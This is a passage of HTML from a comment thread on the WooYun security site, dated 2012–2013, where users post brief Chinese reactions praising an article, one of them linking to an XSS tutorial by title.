class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Blackeagle</span> <span class="reply-time">2013-01-06 19:56:58</span></div><p></p><p>过来围观下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">open</span> <span class="reply-time">2013-01-06 19:40:19</span></div><p></p><p>牛B！我最膜拜这句</p><p>-什么?不可能?<br>-风太大,听不见. - .-</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">infper</span> <span class="reply-time">2013-01-06 17:56:42</span></div><p></p><p>膜拜！畅快淋漓！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wanglaojiu</span> <span class="reply-time">2013-01-06 16:57:25</span></div><p></p><p>好详细，第一次见。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2013-01-06 12:01:21</span></div><p></p><p>学网易？？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">redrain有节操</span> <span class="reply-time">2013-01-06 01:57:36</span></div><p></p><p>碉堡了，mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GaRY</span> <span class="reply-time">2013-01-04 12:28:12</span></div><p></p><p>我操,碉堡</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">imlonghao</span> <span class="reply-time">2012-12-29 16:48:22</span></div><p></p><p>顶一个，看看看到有这个站~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">shine</span> <span class="reply-time">2012-12-29 15:25:55</span></div><p></p><p>很详细了，学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黄小昏</span> <span class="reply-time">2012-12-29 15:04:42</span></div><p></p><p>mark 学习了，精华就是猛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xhm1n9</span> <span class="reply-time">2012-12-29 11:54:38</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">se55i0n</span> <span class="reply-time">2012-12-29 11:50:08</span></div><p></p><p>经典就不要藏着掖着了呀~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blue</span> <span class="reply-time">2012-12-29 11:45:07</span></div><p></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-016532" rel="nofollow">WooYun: [腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">w5r2</span> <span class="reply-time">2012-12-29 10:55:18</span></div><p></p><p>有就拿上来看看撒。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Adra1n</span> <span class="reply-time">2012-12-29 09:40:11</span></div><p></p><p>牛叉啊！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2012-12-28 23:20:17</span></div><p></p><p>貌似还有其它经典的......</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2012-12-28 23:18:04</span></div><p></p><p>广告位招租。</p><p></p></div></div></div></div></div></main>
